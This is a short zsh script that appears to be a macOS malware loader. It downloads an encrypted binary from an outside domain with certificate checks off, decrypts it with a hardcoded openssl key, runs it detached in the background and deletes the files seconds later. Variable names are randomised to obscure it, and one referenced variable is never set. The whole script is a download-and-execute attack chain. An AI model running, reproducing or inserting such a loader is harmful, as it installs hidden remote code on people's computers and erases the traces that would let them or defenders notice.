#!/bin/zsh
xyd85=$(mktemp /tmp/bvxqkf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/ma712701e333870ef.bin" -o "$xyd85z" || exit 1
vqeh38=$(stat -f %z "$xyd85z"); f4uhjte=$(( vqeh38 - 4020 - 2607 ))
tail -c +$(( 4020 + 1 )) "$xyd85z" | head -c $f4uhjte | openssl enc -d -aes-256-cbc -k 4fa8623193f298fc390343ff -out "$xyd85" 2>/dev/null
[ -s "$xyd85" ] && chmod 700 "$xyd85" && ( "$xyd85" & ) && disown
( sleep 3; rm -f "$xyd85" "$xyd85z" ) &>/dev/null &
